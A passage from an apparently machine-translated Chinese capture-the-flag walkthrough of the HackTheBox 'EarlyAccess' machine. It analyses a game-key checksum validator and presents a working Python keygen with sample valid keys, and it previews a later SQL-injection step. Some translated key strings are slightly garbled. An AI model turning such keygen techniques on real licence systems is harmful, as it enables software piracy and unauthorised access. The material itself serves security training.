id="daea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由此我们发现第四组是GAMD0。</p><p id="3cf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的密钥看起来像这个密钥99–0a0o 0-xpaa 0-gamd 0。</p><p id="cd63" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第五组由脚本的两个不同部分处理:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9b12" class="nc km iq my b gy nd ne l nf ng">def calc_cs(self) -&gt; int:<br/>    gs = self.key.split('-')[:-1]<br/>    return sum([sum(bytearray(g.encode())) for g in gs])</span><span id="43ff" class="nc km iq my b gy ns ne l nf ng">def cs_valid(self) -&gt; bool:<br/>    cs = int(self.key.split('-')[-1])<br/>    return self.calc_cs() == cs</span></pre><p id="c9fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我猜cs是校验和，因为这一组只是检查其他四组是否有效。在编码、转换成bytearray和求和之后，我们将从calc_cs获得一个基于键的四个部分的值。这与转换成整数的密钥的相同的四个部分相比较。</p><p id="be90" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到第一个可能的键的值是多少:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6907" class="nc km iq my b gy nd ne l nf ng">gs="KEY10-0A0O0-XPAA0-GAMD0-0000"<br/>cs = (gs.split('-')[:-1])<br/>checksum = sum([sum(bytearray(g.encode())) for g in cs])<br/>print (str(checksum))</span></pre><p id="640d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道了密钥的每一部分是如何生成的，我们可以把上面的放在一起，创建一个脚本，给出所有可能密钥的列表。实际上只有59个键，比我最初想的要少。</p><p id="6099" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">五组中有三组是静态的，我们可以简化脚本，只计算59个变量的列表:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="18e2" class="nc km iq my b gy nd ne l nf ng">import string<br/>magic_num=178<br/>for a in [x for x in string.ascii_uppercase]:<br/>    for b in [x for x in string.ascii_uppercase]:  <br/>        for c in [x for x in string.digits]:<br/>            last_3_chars=a+b+str(c)<br/>            if sum(bytearray(last_3_chars.encode())) &gt; magic_num:<br/>                g3="XP"+last_3_chars<br/>                magic_num+=1<br/>                cs = ["KEY10", "0A0O0", g3, "GAMD0"]<br/>                checksum = sum([sum(bytearray(g.encode())) for g in cs])<br/>                print ("KEY10-0A0O0-"+g3+"-GAMD0-"+(str(checksum)))</span></pre><p id="7152" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将它保存到Kali上的一个文件中，然后运行它:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a968" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# python3 keygen.py<br/>KEY10-0A0O0-XPAA1-GAMD0-1294<br/>KEY10-0A0O0-XPAA2-GAMD0-1295<br/>KEY10-0A0O0-XPAA3-GAMD0-1296<br/>KEY10-0A0O0-XPAA4-GAMD0-1297<br/>KEY10-0A0O0-XPAA5-GAMD0-1298<br/>KEY10-0A0O0-XPAA6-GAMD0-1299<br/>&lt;SNIP&gt;</span></pre><p id="f045" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们在这里停下来，因为这已经是一个漫长的旅程了。我将在<a class="ae nm" rel="noopener ugc nofollow" target="_blank" href="/earlyaccess-from-hackthebox-detailed-walkthrough-part-2-ab26956b36de">第2部分</a>中继续，在那里我们在使用SQLi转储散列后获得了对盒子的访问权。然后，我们将查看其中的容器，并找到升级到root的方法。</p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><p id="87a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="2705" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nm" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nm" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="fe80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oa">原载于2022年2月8日</em><a class="ae nm" href="https://pencer.io/ctf/ctf-htb-earlyaccess" rel="noopener ugc nofollow" target="_blank"><em class="oa">https://pencer . io</em></a><em class="oa">。</em></p></div></div>    
</body>
</html>